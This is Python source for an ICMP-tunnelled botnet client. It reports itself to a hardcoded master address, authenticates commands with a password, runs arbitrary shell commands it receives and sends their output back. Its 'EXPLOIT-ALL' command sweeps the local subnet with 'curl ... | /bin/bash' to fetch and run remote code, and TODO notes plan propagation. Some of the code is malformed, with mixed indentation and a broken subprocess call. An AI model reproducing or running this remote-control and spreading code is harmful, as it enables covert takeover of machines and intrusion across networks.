from icmp_tunnel import *
import Queue
import threading
import os
import subprocess

MASTER = "10.80.100.20"
PASSWORD = "OkayNowYouCanUseMe"
WEB = "www.ILoveRed.com"
cmdQueue = Queue.Queue()

class Handler(threading.Thread):
    def __init__(self, master, passwd, web, q):
      	self.master = master
	self.passwd = passwd
	self.web = web
	self.q = q

	threading.Thread.__init__(self)

    def run(self):
	print("Listening...")
        while True:
            if not self.q.empty():
                #BUILT IN CMD FORMAT IS AS FOLLOWS
                #<command here>------>arg1 arg2 arg3
                #OTHERWISE COMMANDS WILL JUST BE EXECUTED AND THEIR OUTPUT RETURNED
	
		raw = self.q.get()
		print(raw)
		if self.passwd in raw:	#Is this legit data?
			if "----->" in raw:	#Is this a builtin?
				builtin = raw.strip(self.passwd).split("----->")
				if builtin[0] == "SET-MASTER":
					self.master = builtin[1]
				elif builtin[0] == "SET-PASS":
					self.passwd = builtin[1]
				elif builtin[0] == "SET-WEB":
					self.web = builtin[1]
				elif builtin[0] == "RESET-EMERGENCY-OMG":
					self.passwd = "DEFAULT-HARDCODED"
					self.web = "www.DEFAULT.com"
				elif builtin[0] == "EXPLOIT-ALL":
					octets = localhost.split(".")
					for i in range(1,253):
						if i != octets[3]:
							out = subprocess.check_output("curl", self.web ,octets[0]+"."+octets[1]+"."+octets[2]+"."+str(i), "|","/bin/bash")
							send_icmp(localhost, self.master, "EXPLOIT-OUTPUT"+out)
						
			else:
				print self.passwd
				cmd = raw[len(self.passwd):]
				print("RECEIVED: "+cmd)
				out = subprocess.check_output(cmd.split())
				print("OUT: "+str(out))
				send_icmp(localhost, self.master, "OUTPUT"+out)

def init():
	print("Bot started...["+localhost+"]")
	send_icmp(localhost, MASTER, "NEW-BOT-INIT:"+localhost)

def main():
	init()
	listener = Listener(cmdQueue)
    	handler = Handler(MASTER, PASSWORD, WEB, cmdQueue)
    	listener.start()
    	handler.start()
main()

##TODO: TEST FILE TRANSFERS
##TODO: IMPLEMENT BOT BUILT-IN'S
##TODO: PROPAGATION AND MANAGEMENT

